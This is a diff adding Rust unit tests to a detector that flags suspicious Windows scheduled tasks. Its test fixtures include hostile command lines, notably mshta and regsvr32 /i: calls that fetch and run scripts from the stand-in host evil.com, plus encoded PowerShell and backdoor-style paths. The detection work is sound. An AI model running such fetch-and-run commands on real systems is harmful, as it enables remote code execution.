@@ -279,4 +279,115 @@ mod tests {
         assert!(!classify_scheduled_task("\\Task", ""));
         assert!(!classify_scheduled_task("", "cmd.exe"));
     }
+
+    /// -encodedcommand flag is suspicious.
+    #[test]
+    fn classify_suspicious_encodedcommand_flag() {
+        assert!(classify_scheduled_task(
+            "\\BadTask",
+            "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
+        ));
+    }
+
+    /// tmp directory in action is suspicious.
+    #[test]
+    fn classify_suspicious_tmp_path() {
+        assert!(classify_scheduled_task(
+            "\\Task",
+            "C:\\Windows\\Temp\\tmp\\evil.exe"
+        ));
+    }
+
+    /// Downloads directory in action is suspicious.
+    #[test]
+    fn classify_suspicious_downloads_path() {
+        assert!(classify_scheduled_task(
+            "\\Task",
+            "C:\\Users\\User\\Downloads\\backdoor.exe"
+        ));
+    }
+
+    /// Public directory in action is suspicious.
+    #[test]
+    fn classify_suspicious_public_path() {
+        assert!(classify_scheduled_task(
+            "\\Task",
+            "C:\\Users\\Public\\update.exe"
+        ));
+    }
+
+    /// mshta in action is suspicious regardless of task path.
+    #[test]
+    fn classify_suspicious_mshta() {
+        assert!(classify_scheduled_task(
+            "\\Microsoft\\Windows\\Legit",
+            "mshta.exe http://evil.com/payload.hta"
+        ));
+    }
+
+    /// regsvr32 /s /n /u /i: pattern is suspicious.
+    #[test]
+    fn classify_suspicious_regsvr32() {
+        assert!(classify_scheduled_task(
+            "\\Task",
+            "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
+        ));
+    }
+
+    /// wscript on non-Microsoft task is suspicious.
+    #[test]
+    fn classify_suspicious_wscript_nonstandard() {
+        assert!(classify_scheduled_task(
+            "\\EvilTask",
+            "wscript.exe C:\\evil\\payload.vbs"
+        ));
+    }
+
+    /// cscript on non-Microsoft task is suspicious.
+    #[test]
+    fn classify_suspicious_cscript_nonstandard() {
+        assert!(classify_scheduled_task(
+            "\\UpdateTask",
+            "cscript.exe //nologo C:\\scripts\\evil.vbs"
+        ));
+    }
+
+    /// powershell on Microsoft-prefixed task (without suspicious flags) is benign.
+    #[test]
+    fn classify_microsoft_powershell_benign() {
+        assert!(!classify_scheduled_task(
+            "\\Microsoft\\Windows\\PowerShell",
+            "powershell.exe -NonInteractive -Command Get-Item C:\\Windows"
+        ));
+    }
+
+    /// microsoft\\ prefix (no leading backslash) is also treated as standard.
+    #[test]
+    fn classify_microsoft_no_leading_slash_benign() {
+        assert!(!classify_scheduled_task(
+            "Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
+            "C:\\Windows\\System32\\usoclient.exe StartScan"
+        ));
+    }
+
+    /// ScheduledTaskInfo serializes correctly.
+    #[test]
+    fn scheduled_task_info_serializes() {
+        let info = ScheduledTaskInfo {
+            name: "\\EvilTask".to_string(),
+            path: "\\EvilTask".to_string(),
+            action: "powershell.exe -enc AAAA".to_string(),
+            author: "SYSTEM".to_string(),
+            enabled: true,
+            last_run_time: 0x01D8_ABCD_1234_5678,
+            next_run_time: 0x01D8_DCBA_8765_4321,
+            is_suspicious: true,
+        };
+
+        let json = serde_json::to_string(&info).unwrap();
+        assert!(json.contains("\"name\":\"\\\\EvilTask\""));
+        assert!(json.contains("\"enabled\":true"));
+        assert!(json.contains("\"is_suspicious\":true"));
+        assert!(json.contains("\"author\":\"SYSTEM\""));
+    }
 }
